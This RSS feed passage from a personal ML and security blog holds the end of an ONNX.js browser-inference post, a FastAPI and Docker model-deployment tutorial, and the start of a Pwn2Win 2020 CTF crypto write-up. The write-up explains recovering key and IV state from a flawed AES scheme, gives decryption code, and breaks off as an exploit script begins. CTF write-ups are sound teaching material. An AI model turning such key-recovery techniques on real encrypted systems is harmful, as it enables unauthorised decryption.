&lt;p&gt;ONNX defines a common set of operators - the building blocks of machine learning and deep learning models - and a common file format to enable AI developers to use models with a variety of frameworks, tools, runtimes, and compilers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/onnxjs&#34;&gt;ONNX.js&lt;/a&gt; is an open source Javascript library by Microsoft for running ONNX models on browsers and on Node.js. Like Tensorflow.js and WebDNN, it also has support for WebGL and CPU. From theit Github&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;With ONNX.js, web developers can score pre-trained ONNX models directly on browsers with various benefits of reducing server-client communication and protecting user privacy, as well as offering install-free and cross-platform in-browser ML experience.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With ONNX.js, I used a pretrained &lt;a href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/files/resnet50_8.onnx&#34;&gt;ResNet50 model&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Loading the model is similar -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/07658e9b0b4dc759fb4f081cd9ea7b78.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The ONNX examples on their repository gives some nice code snippets to show basic image preprocessing. I have used it directly in my code.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/1a2f6059395c60485e4d721c7afd761b.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;After that, the following code snippet loads the preprocessed image to an input tensor and then runs the model on it and then prints the predictions.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/7e4366058eac9a8c1f05a82b569ff91a.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;A demo of the webapp using ONNX.js is shown below.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx1.gif&#34; data-caption=&#34;ONNX.js predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx1.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    ONNX.js predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx2.gif&#34; data-caption=&#34;ONNX.js predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx2.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    ONNX.js predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The Resnet model does an awesome job with the airline image and classifies it correctly. It also performs decently on the bus image giving the top prediction as &lt;em&gt;minibus&lt;/em&gt;. However, the goal of this post is not to judge how well the model works, but the technique of deploying the models and receiving predictions from them.&lt;/p&gt;
&lt;p&gt;I used the WebGL model for testing. It takes an average of 70ms to serve the predictions. The CPU version takes a VERY long time ~15000ms (15 seconds).&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below. I had some trouble with the WASM version so I didn&amp;rsquo;t include them in the results.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;15000ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;71ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The best part about ONNX is that it is an open standard and allows easy conversion of models made in different frameworks to a &lt;code&gt;.onnx&lt;/code&gt; model. I would suggest going through &lt;a href=&#34;https://github.com/onnx/tutorials&#34;&gt;this tutorial&lt;/a&gt; for this.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/ONNX&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;the-end&#34;&gt;The End&lt;/h2&gt;
&lt;p&gt;That is all for now. I hope that this tutorial will help the reader get an idea of these frameworks for client-side model deployment and one can also use my code as a boilerplate for setting up webapps of your own for deploying ML models using these frameworks.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Quick tutorial to deploy your ML models using FastAPI and Docker</title>
      <link>https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/</link>
      <pubDate>Mon, 30 Nov 2020 11:21:53 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/</guid>
      <description>&lt;p&gt;The goal of this blog post is to make an API to get predictions from a pre-trained ML model and how we can do that in a fast manner using &lt;a href=&#34;https://fastapi.tiangolo.com/&#34;&gt;FastAPI&lt;/a&gt; and also be able to ship it using &lt;a href=&#34;https://www.docker.com/&#34;&gt;Docker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This method does not scale well as it does not support caching and cannot handle much load. However, this can be a good instructional post on how you can deploy those models and use them for small low-scale projects, say a hackathon.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In the tutorial we will use the very famous Iris dataset. The dataset has 4 features -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sepal Length&lt;/li&gt;
&lt;li&gt;Sepal Width&lt;/li&gt;
&lt;li&gt;Petal Length&lt;/li&gt;
&lt;li&gt;Petal Width&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These lengths are in cm, and these fields are used to predict the type of the Iris, among 3 categories - Setosa, Versicolour and Virginica.&lt;/p&gt;
&lt;h2 id=&#34;project-structure&#34;&gt;Project Structure&lt;/h2&gt;
&lt;p&gt;Given below is the outline of the files and location of the files so that it is easier for one to follow the tutorial.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ml-deployment/
│   .gitignore
│   Dockerfile
│   logs.log
│   README.md
│   request.py
│   requirements.txt
│   server.py
│
├───models
        iris.py
        model.pkl
        model.py
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;model-training&#34;&gt;Model Training&lt;/h2&gt;
&lt;p&gt;Since the goal here is just to make a POC deployment, we make a very simple model trained on the Iris dataset. Some very basic knowledge of Scikit-learn libraries will be needed to understand the code.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/fcb121e5c428895be24e58edec1c3ebe.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The model is saved in a pickle format. We will load the saved model to do predictions later.&lt;/p&gt;
&lt;p&gt;Now, along with this, we have to ensure that when the API will receive the paprameters, it receives them in a proper format, for example, a list of lists in which each list has 4 float values for the features.&lt;/p&gt;
&lt;p&gt;For that we use &lt;a href=&#34;https://github.com/samuelcolvin/pydantic&#34;&gt;Pydantic&lt;/a&gt;.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f45af7bad35c6c75cc695dd8f209c2c7.js&#34;&gt;&lt;/script&gt;

&lt;h2 id=&#34;creating-the-api&#34;&gt;Creating the API&lt;/h2&gt;
&lt;p&gt;As mentioned earlier, we use FastAPI to make our API. From the website -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.6+ based on standard Python type hints.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It also claims to have &lt;em&gt;Very high performance, on par with NodeJS and Go (thanks to Starlette and Pydantic). One of the fastest Python frameworks available.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The whole code is given below, I&amp;rsquo;ll explain the details below as well.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/3ccaafb643fb1d387137550c715610cc.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Here, we define the name of our app.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FastAPI(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Iris Classifier API&amp;#34;&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;API for Iris classification using ML&amp;#34;&lt;/span&gt;, version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next, we set up logging for our API as well, to ensure we can see WHEN something went wrong, in case something does go wrong.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Initialize logging&lt;/span&gt;
my_logger &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getLogger()
my_logger&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setLevel(logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG)
logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;basicConfig(level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logs.log&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we use a FastAPI decorator called &lt;code&gt;@app.on_event(&amp;quot;startup&amp;quot;)&lt;/code&gt; to specify the operation which we want to perform when the server starts up. Here we load our model so that once the model is loaded in the initial phase, the predictions can be served as fast as possible.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@app.on_event&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;startup&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load_model&lt;/span&gt;():
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;models/model.pkl&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, our main logic of serving the predictions -&lt;/p&gt;
&lt;p&gt;We get the data that the API receives from the server and require it to be in the &lt;code&gt;Iris&lt;/code&gt; format, which we specified using Pydantic.&lt;/p&gt;
&lt;p&gt;We run the model on those examples, get the predictions and then map them to the flower type. The classification and the model probability of the prediction is returned as a JSON response.&lt;/p&gt;
&lt;p&gt;We have a try-catch blog to make ensure any wrong input format or any other kinds of errors does not break the server.&lt;/p&gt;
&lt;h2 id=&#34;lets-see-it-in-action&#34;&gt;Let&amp;rsquo;s see it in action&lt;/h2&gt;
&lt;p&gt;The FastAPI provides a dashboard from where we send requests to the API. It is at &lt;code&gt;http://localhost:8000/docs&lt;/code&gt;.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/docs.PNG&#34; data-caption=&#34;Sending sample request to FastAPI&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/docs.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Sending sample request to FastAPI
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/response.PNG&#34; data-caption=&#34;Response from FastAPI&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/response.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Response from FastAPI
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h2 id=&#34;dockerise-everything&#34;&gt;Dockerise Everything!&lt;/h2&gt;
&lt;p&gt;So now, if we have to ship it, we want to convert it into a Docker image.&lt;/p&gt;
&lt;p&gt;For that we create a Dockerfile.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f4d7a32e2790b32a8f18dbcb583cc817.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Basically, the Dockerfile instructs Docker to first create a &lt;code&gt;/app&lt;/code&gt; folder inside the Docker &lt;strong&gt;python3.8&lt;/strong&gt; base image, install the requirements (Python packages) and then run the app on port 8000 in the Docker container, and expose that port to access it from our local machine.&lt;/p&gt;
&lt;p&gt;Now, we just have to run two commands -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker build -t iris-ml .  # Build the Docker image
$ docker run -d -p 8000:8000 --name iris-api iris-ml   # Run the Docker image as container
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The requirements.txt for the project are also listed below -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;numpy==1.18.4
pydantic==1.6.1
requests==2.24.0
fastapi==0.61.1
scikit_learn==0.23.2
uvicorn==0.11.8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now you can head to &lt;a href=&#34;%5Bhttp://localhost:8000/docs%5D&#34;&gt;http://localhost:8000/docs&lt;/a&gt; to test the API.&lt;/p&gt;
&lt;p&gt;If you see the dashboard and the responses similar to the screenshots above, you have most likely deployed it successfully.&lt;/p&gt;
&lt;h3 id=&#34;congratulations&#34;&gt;Congratulations!!&lt;/h3&gt;
&lt;p&gt;Now that you have the Docker image, the entire environment can be recreated on any other machine. You can push the image to DockerHub (&lt;a href=&#34;https://ropenscilabs.github.io/r-docker-tutorial/04-Dockerhub.html&#34;&gt;refer here&lt;/a&gt;) or export as a &lt;a href=&#34;https://stackoverflow.com/questions/23935141/how-to-copy-docker-images-from-one-host-to-another-without-using-a-repository&#34;&gt;tar file&lt;/a&gt; to share to another host.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The entire code is also available on my Github - &lt;a href=&#34;https://github.com/shreyansh26/Weekend-Projects/tree/master/MLDeployment/v1&#34;&gt;https://github.com/shreyansh26/Weekend-Projects/tree/master/MLDeployment/v1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  &lt;/p&gt;
&lt;p&gt;This is all for now. I will also be writing about few other approaches to deploy relatively heavier models and also scalable approaches to Model hosting. Thanks for reading!&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Androids Encryption (Crypto) - Pwn2Win CTF 2020</title>
      <link>https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/</link>
      <pubDate>Mon, 01 Jun 2020 12:32:46 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/</guid>
      <description>&lt;h3 id=&#34;crypto-115---108-solves&#34;&gt;crypto 115 - 108 solves&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;We intercept an algorithm that is used among Androids. There are many hidden variables. Is it possible to recover the message?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: andre_smaira&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Server: nc encryption.pwn2.win 1337&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://pwn2.win/NIZKCTF-js/challenges/androids_encryption&#34;&gt;Challenge link&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/files/server.py&#34;&gt;Challenge files&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;On connecting to the challenge service, we are given two options -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/options.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/options.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also, in the server.py file, we see there are two functions, &lt;code&gt;enc_plaintext&lt;/code&gt; and &lt;code&gt;enc_flag&lt;/code&gt;. Both these functions call the &lt;code&gt;encrypt&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;enc_plaintext&lt;/code&gt; functions calls &lt;code&gt;encrypt&lt;/code&gt; with the plaintext supplied by the user (encoded in base64), key1 and iv1 (which are secret values) as arguments.&lt;br&gt;
The &lt;code&gt;enc_flag&lt;/code&gt; fucntion takes as arguments the secret flag and iv2 and key2 which are actually derived from iv1, key1 and the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;iv2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key1, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(iv1)
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;encrypt&lt;/code&gt; function returns the base64 encoding of the (iv+ciphertext) string.&lt;/p&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;p&gt;We see that every time &lt;code&gt;encrypt&lt;/code&gt; is called, the key2 and iv2 values are updated. iv2 becomes the AES-ECB decryption of the old iv2 and key2 is now the first block of the ciphertext (since the xor function with one argument simply returns the first block of the argument). So, our goal is now to recover the key2 and iv2 values so we can then reverse the &lt;code&gt;encrypt_flag&lt;/code&gt; function and recover the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/update.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/update.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;If we call &lt;code&gt;encrypt_flag&lt;/code&gt; (Choice 2) the first time, then the new key2 value will be the first block of the ciphertext. Nnow during this, the iv2 has also been updated but we don&amp;rsquo;t know that value, since the first part of the returned value, is the old iv2.&lt;/p&gt;
&lt;p&gt;So, what we do next is call the &lt;code&gt;encrypt_flag&lt;/code&gt; (Choice 2) function again, then we get the new iv2 value along with the ciphertext. This means taht now we know the iv2 and the key2 value taht was used to encrypt the flag to obtain the ciphertext. What remains now, is just to reverse the &lt;code&gt;encrypt&lt;/code&gt; function and call it with our values of the ciphertext, key2 and iv2. This will get us the flag.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;decrypt&lt;/code&gt; function can be written as -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid key size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(iv) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid IV size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(txt) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid plaintext size&amp;#39;&lt;/span&gt;
    bs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; to_blocks(txt)
    ctxt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
    curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
        curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The complete exploit code is shown below -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
